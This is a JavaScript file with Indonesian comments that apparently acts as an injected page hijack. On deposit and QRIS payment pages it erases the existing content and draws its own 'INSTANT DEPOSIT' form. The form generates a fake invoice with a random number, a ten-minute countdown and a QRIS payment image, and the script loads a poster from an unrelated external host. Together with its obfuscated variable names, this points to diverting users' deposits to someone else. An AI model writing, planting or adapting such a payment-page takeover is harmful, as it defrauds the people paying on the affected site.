document.addEventListener("DOMContentLoaded", function () {
  const _0x5b2f = new URLSearchParams(window.location.search);
  const _0xa9d1 = window.location.pathname;

  if (!_0x5b2f.has("bank") && !_0xa9d1.endsWith("/qris.php") && _0x5b2f.get("page") !== "deposit" &&
    !_0xa9d1.endsWith("/deposit") && !_0xa9d1.endsWith("/deposit.php")) {
    console.log("Skrip tidak berjalan karena bukan di halaman yang sesuai.");
    return;
  }

  console.log("Skrip berjalan di halaman yang sesuai.");

  // Tambahkan animasi background gelap
  const style = document.createElement("style");
  style.innerHTML = `
    @keyframes darkFade {
      0% { background-color: #0d0d0d; }
      25% { background-color: #1a1a1a; }
      50% { background-color: #121212; }
      75% { background-color: #1e1e1e; }
      100% { background-color: #0d0d0d; }
    }
    body {
      animation: darkFade 30s infinite alternate;
    }
    input::placeholder {
      color: #ccc;
    }
  `;
  document.head.appendChild(style);

  // Reset halaman
  document.body.innerHTML = "";
  document.body.style.margin = "0";
  document.body.style.padding = "0";
  document.body.style.height = "100vh";
  document.body.style.fontFamily = "sans-serif";

  const overlay = document.createElement("div");
  overlay.className = "overlay";
  overlay.style.cssText = `
    background: rgba(255, 255, 255, 0.05);
    backdrop-filter: blur(10px);
    min-height: 100vh;
    padding: 30px;
    display: flex;
    flex-direction: column;
    align-items: center;
  `;

  overlay.innerHTML = `
    <div class="logo-text" style="font-size: 28px; font-weight: bold; color: white; margin-bottom: 30px; text-shadow: 1px 1px 5px black;">
      INSTANT DEPOSIT
    </div>
    <form class="form" id="depositForm" style="background: rgba(255,255,255,0.1); padding: 20px; border-radius: 15px; max-width: 400px; width: 100%; text-align: center;">
      <input type="text" id="userid" placeholder="User ID" required style="width: 100%; padding: 10px; margin: 10px 0; font-size: 16px; border: none; border-radius: 5px; color: #d2a679; background: rgba(255,255,255,0.05);" />
      <input type="text" id="nominal" placeholder="Min.Deposit 50.001/Max.Deposit 100 Juta" required style="width: 100%; padding: 10px; margin: 10px 0; font-size: 16px; border: none; border-radius: 5px; color: #d2a679; background: rgba(255,255,255,0.05);" />
      <button type="submit" style="padding: 10px 20px; font-size: 16px; border: none; background: #007bff; color: white; border-radius: 5px; cursor: pointer;">Deposit</button>
    </form>
    <div class="invoice" id="invoice" style="display: none; background: rgba(255,255,255,0.1); padding: 20px; border-radius: 15px; max-width: 400px; width: 100%; margin-top: 20px; text-align: left; color: white;">
      <h2 style="text-align: center;">Invoice</h2>
      <p><strong>No. Invoice:</strong> <span id="invNumber"></span></p>
      <p><strong>TGL:</strong> <span id="tglNow"></span></p>
      <p><strong>Batas Pembayaran:</strong> <span id="batasWaktu"></span></p>
      <p><strong>Sisa Waktu:</strong> <span id="countdown"></span></p>
      <p><strong>Status:</strong> <span id="status" style="font-weight: bold; color:red;">UNPAID</span></p>
      <p><strong>Keterangan:</strong> Topup Instan Deposit <span id="userInfo"></span></p>
      <p><strong>Jumlah:</strong> IDR <span id="jumlah"></span></p>
      <p><strong>Biaya Layanan:</strong> IDR 0</p>
      <p><strong>Total Bayar:</strong> IDR <span id="jumlahTotal"></span></p>
      <p><strong>Pembayaran via QRIS:</strong></p>
      <img class="qris" src="" alt="QRIS" style="display:block;margin:10px auto;max-width:250px;" />
    </div>
    <img src="https://gtyfup2m.112400c1199c.com/poster-QRIS.jpg" alt="Partners" style="margin-top: 40px; max-width: 90%;" />
  `;

  document.body.appendChild(overlay);

  function formatNominal(input) {
    let value = input.value.replace(/\D/g, '');
    input.value = value.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
  }

  function generateInvoiceNumber() {
    return 'INV' + Math.random().toString(36).substring(2, 10).toUpperCase();
  }

  function formatDate(date) {
    return date.toISOString().slice(0, 19).replace('T', ' ');
  }

  function countdownTimer(deadline) {
    const statusEl = document.getElementById("status");
    const countdownEl = document.getElementById("countdown");
    const interval = setInterval(() => {
      const now = new Date();
      const diff = deadline - now;
      if (diff <= 0) {
        clearInterval(interval);
        statusEl.textContent = "EXPIRED";
        statusEl.style.color = "gray";
        countdownEl.textContent = "00:00:00";
      } else {
        const mins = Math.floor(diff / 1000 / 60);
        const secs = Math.floor(diff / 1000 % 60);
        countdownEl.textContent =
          String(Math.floor(mins / 60)).padStart(2, '0') + ":" +
          String(mins % 60).padStart(2, '0') + ":" +
          String(secs).padStart(2, '0');
      }
    }, 1000);
  }

  function handleSubmit(e) {
    e.preventDefault();
    const userid = document.getElementById("userid").value;
    const nominal = document.getElementById("nominal").value.replace(/\./g, '');
    const nominalFormatted = parseInt(nominal).toLocaleString('id-ID');

    document.querySelector(".form").style.display = "none";
    document.getElementById("invoice").style.display = "block";

    const now = new Date();
    const deadline = new Date(now.getTime() + 10 * 60 * 1000);

    document.getElementById("invNumber").textContent = generateInvoiceNumber();
    document.getElementById("tglNow").textContent = formatDate(now);
    document.getElementById("batasWaktu").textContent = formatDate(deadline);
    document.getElementById("userInfo").textContent = userid;
    document.getElementById("jumlah").textContent = nominalFormatted;
    document.getElementById("jumlahTotal").textContent = nominalFormatted;

    countdownTimer(deadline);
  }

  document.getElementById("nominal").addEventListener("input", function () {
    formatNominal(this);
  });

  document.getElementById("depositForm").addEventListener("submit", handleSubmit);
});
